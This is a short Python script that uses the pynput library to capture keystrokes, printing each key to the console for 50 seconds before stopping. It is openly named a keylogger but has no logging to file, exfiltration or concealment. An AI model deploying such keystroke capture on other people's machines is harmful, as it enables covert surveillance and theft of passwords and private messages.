from pynput.keyboard import Listener
from pynput.keyboard import Key
import os

class Keylogger:
    def __init__(self):
        self.listener = None

    def start(self):
        def on_press(key):
            print(key)
            key = str(key)
            if (key.startswith("Key.")): key = key[4:]
            else: key = key.strip('\'')
            
        
        self.listener = Listener(on_press=on_press)
        self.listener.start()

    def stop(self):
        self.listener.stop()
        
keylogger = Keylogger()
keylogger.start()
import time
time.sleep(50)
keylogger.stop()

